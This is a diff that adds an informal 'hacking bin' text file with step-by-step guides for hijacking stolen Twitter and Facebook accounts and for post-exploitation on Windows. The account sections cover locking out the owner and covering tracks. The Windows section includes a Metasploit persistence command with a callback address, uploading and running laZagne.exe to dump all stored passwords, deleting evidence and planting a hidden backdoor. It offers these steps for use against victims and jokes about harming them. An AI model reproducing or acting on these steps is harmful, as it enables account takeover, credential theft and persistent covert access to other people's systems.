@@ -1,0 +1,49 @@
+The Greatest Hacking Bin.? really lol
+
+#########################
+#1 Social Media: Twitter
+#2 Social Media: Facebook
+#3 Owning the system: Windows
+#########################
+
+
+###
+#1#
+###
+  Once you gain the credidentials of the victim within using attack methods for example: Phishinig, bruteforce, or plain stupidity
+  1) Do not login yet!
+  2) It is always good to change your mac address && spoof your useragent
+  3) Dont forget to use a vpn or route your network behind tor
+  4) once logged into the user; it is also good to always change the email addres with temp-mail.org this will stop the user from seeing the email address.
+  5) Change the password to recomended password-generated && now if the user has any other extenstions for example phone numbers delete as soon as posible.
+  6) Ok now twitter stores last logins and other data so it is good to check the last data that was logged in then save it for finding more info about the target, dont forget to clean the data after ;)
+  7) If you are willing to deface there account page do it in STYLE ;) BUT BECAREFUL: what now!!! well dont forget exif data exists i recomend deleting it from tracking, one other thing use js code to delete all tweets
+  8) Now you have a owned account that nobody can access unless the nsa/fbi come at you, you should be fine to do what you want :)
+  
+
+###
+#2#
+###
+   1) Real hackers dont use facebook!
+   2) but i will show you very simple tip for facebook if you used bruteforce or any other
+   3) do the pretty much same thing with twitter but facebook privacy logs alot more so you are able to download all info and delete it the info should show pin point location :)
+
+###
+#2#
+###
+  1) We all love owning the most vulnrable os yet! ;)
+  2) So lets get started Once you have gained access to the system in any, it is good to get ready for the fun part!
+  3) I like to use metasplotis handler it has many features for example using exploit sugester, loading python, loading powershell and more
+  4) So if you dont have full privileges then it is good to try and run exploit suggester as a start of finding a vulnrability escalation on the system
+  5) if that does not work i like to use a great tool called searchsploit and Findsploit you give it a string to search for and will look through big databases for the exploits
+  6) if there is no hope in your life theres a great 1337 tool called google or duckduckgo or you can do some researching and find the vulnrabilities yourself this could take some time...
+  7) Ok moving on, if you dont have priv still you should get my point it is simple to find public exploits or learn to create your own.
+  8) Now it is to create a persistant backdoor into the system it will only be activated on reboot this lets you have a persistant backdoor on the target until they disclose it.
+  9) For a metasploit persistant backdoor it is good to run somthing similar to this "run persistence -A -L c:\\ -X -p443 -r 192.168.1.40"
+  10) Awesome we are now close to making the victim sucicidal jk, now we want to extract all information and passwords huehu
+  11) the latest and greatest i use is laZagne.exe its a nice and simple tool for windows its created in python and then used py2exe to compile it so the victim will need python installed
+  12) so on metasploit again to upload laZagne.exe you will need to do in meterpreter "upload /home/$USER/laZagne.exe" this will upload the file to the windows machine
+  13) now open up a shell and go into the directory of laZagne.exe and then run "laZagne.exe --all" well its easy to understand the meaning of this ;)
+  14) Whoo now its up to you to choose you can go and hide the evidence now or go and exploit your way through deeper into there secrets!
+  15) I will be hiding my way throught first, so i will delete any uploaded files and then setup a hidden backdoor for incase i get disconnected!
+  16) I think its pretty much sums everything up on windows exploiting
